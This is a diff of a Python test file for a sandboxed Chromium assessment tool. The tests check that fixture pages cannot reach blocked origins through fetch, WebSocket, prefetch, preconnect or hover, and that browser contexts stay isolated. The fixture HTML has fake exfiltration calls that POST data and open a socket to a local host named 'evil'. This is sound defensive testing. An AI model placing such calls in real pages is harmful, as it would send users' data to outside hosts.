@@ -51,7 +51,8 @@ def test_browser_subresources_redirects_websockets_workers_and_writes_never_hit_
       <script>
         fetch('{evil}/get').catch(()=>{{}});
         fetch('{evil}/write',{{method:'POST',body:'FAKE'}}).catch(()=>{{}});
-        new WebSocket('{evil.replace("http:", "ws:")}/socket');
+        const ws = new WebSocket('{evil.replace("http:", "ws:")}/socket');
+        ws.onclose = () => {{ window.wsClosed = true; }};
         navigator.serviceWorker.register('/worker.js').catch(()=>{{}});
         document.cookie = 'FAKE_COOKIE=secret';
         fetch('/check-cookie').catch(()=>{{}});
@@ -176,3 +177,69 @@ def test_ai_and_evidence_values_are_escaped_through_report_template(tmp_path, ht
     with fitz.open(tmp_path / "report.pdf") as pdf:
         assert "fetch" in "".join(page.get_text() for page in pdf)
     assert attacker.received == []
+
+
+def test_speculative_preconnect_prefetch_and_hover_never_open_blocked_sockets(
+    http_server, monkeypatch
+):
+    import socket
+    import threading
+    import time
+
+    # Raw TCP trap: records connections that never send an HTTP request (preconnects).
+    trap = socket.socket()
+    trap.bind(("127.0.0.1", 0))
+    trap.listen(8)
+    trap.settimeout(0.2)
+    port = trap.getsockname()[1]
+    accepted, stop = [], threading.Event()
+
+    def accept():
+        while not stop.is_set():
+            try:
+                connection, _ = trap.accept()
+            except OSError:
+                continue
+            accepted.append(connection.recv(64))
+            connection.close()
+
+    thread = threading.Thread(target=accept, daemon=True)
+    thread.start()
+    evil = f"http://127.0.0.1:{port}"
+    content = f"""<html><head><link rel=preconnect href='{evil}'>
+      <link rel=dns-prefetch href='http://localhost:{port}'>
+      <link rel=prefetch href='{evil}/prefetch'><link rel=preload as=image href='{evil}/p'>
+      </head><body>Fixture<a href='{evil}/hover'>hover</a></body></html>""".encode()
+    fixture = http_server(lambda r: (200, {"Content-Type": "text/html"}, content))
+    monkeypatch.setattr(network, "_fixture_origins", frozenset({fixture.origin}))
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(**LAUNCH_OPTIONS)
+            try:
+                page = isolate_context(browser).new_page()
+                page.goto(fixture.origin, wait_until="networkidle")
+                page.hover("a")
+                time.sleep(1)
+            finally:
+                browser.close()
+    finally:
+        stop.set()
+        thread.join(5)
+        trap.close()
+    assert accepted == []
+
+
+def test_every_chromium_context_in_product_is_isolated_and_non_persistent():
+    import re
+    from pathlib import Path
+
+    root = Path(__file__).resolve().parents[1] / "ams_assess"
+    for path in root.rglob("*.py"):
+        text = path.read_text()
+        assert "launch_persistent_context" not in text, path.name
+        assert "user_data_dir" not in text and "user-data-dir" not in text, path.name
+        if path.name != "browser_safety.py":
+            # Contexts/pages are only created through isolate_context().
+            assert not re.search(r"\.new_context\(|browser\.new_page\(", text), path.name
+        for launch in re.findall(r"chromium\.launch\(([^)]*)\)", text):
+            assert "**LAUNCH_OPTIONS" in launch, path.name
